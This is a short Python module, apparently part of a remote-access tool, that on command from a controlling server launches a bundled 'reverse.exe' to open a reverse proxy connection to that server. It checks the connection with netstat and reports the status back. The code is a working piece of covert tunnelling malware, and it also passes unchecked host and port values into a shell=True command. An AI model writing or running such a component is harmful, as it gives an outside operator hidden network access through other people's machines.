import subprocess
import os
import time

program_path = os.path.join("files", "proxy", "reverse.exe")

def is_connection_established(host, remote_port):
    try:
        netstat_output = subprocess.check_output(
            f'netstat -ano | findstr "{host}:{remote_port}"', shell=True, stderr=subprocess.STDOUT
        ).decode('utf-8')
        if "ESTABLISHED" in netstat_output.upper():
            return True
        return False
    except subprocess.CalledProcessError:
        return False

def start_reverse_proxy(client, data, HOST, converter):
    try:
        port = data.get("port")
        if not port:
            raise ValueError("Port not provided in data")

        try:
            command = [program_path, "-connect", f"{HOST}:{port}"]
            subprocess.Popen(command, shell=True, stderr=subprocess.STDOUT)

            time.sleep(5)

            if is_connection_established(HOST, port):
                message = "Connected"
            else:
                message = "Not connected"

        except Exception as e:
            raise RuntimeError(f"Failed to start reverse.exe: {e}")
        
        client.emit('message', converter.encode({"reverse_proxy": message}))

    except Exception as e:
        client.emit('message', converter.encode({"reverse_proxy_logger": str(e)}))